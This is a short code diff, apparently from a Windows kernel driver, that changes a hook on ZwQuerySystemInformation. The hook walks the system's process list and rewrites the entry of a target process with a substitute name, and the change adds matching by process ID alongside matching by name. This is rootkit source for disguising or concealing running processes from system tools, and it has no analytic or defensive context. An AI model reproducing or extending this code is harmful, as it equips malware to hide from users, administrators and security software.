@@ -40,7 +40,7 @@ NTSTATUS HookZwQuerySystemInformation(
 					currentProcInfo = (SYSTEM_PROCESS*)SystemInformation;
 					while (currentProcInfo->NextEntryDelta) {
 						if (currentProcInfo->ProcessName.Length) {							
-							if (!wcscmp(currentProcInfo->ProcessName.Buffer, (const wchar_t*)targetName)) {
+							if (!wcscmp(currentProcInfo->ProcessName.Buffer, (const wchar_t*)targetName) || currentProcInfo->ProcessId == TARGET_PID) {
 								if (isFirstProc) {
 									newNameAddr = (PWCHAR)((PCHAR)SystemInformation + *ReturnLength + 5);
 									RtlCopyMemory(newNameAddr, NEW_NAME, sizeof(NEW_NAME));
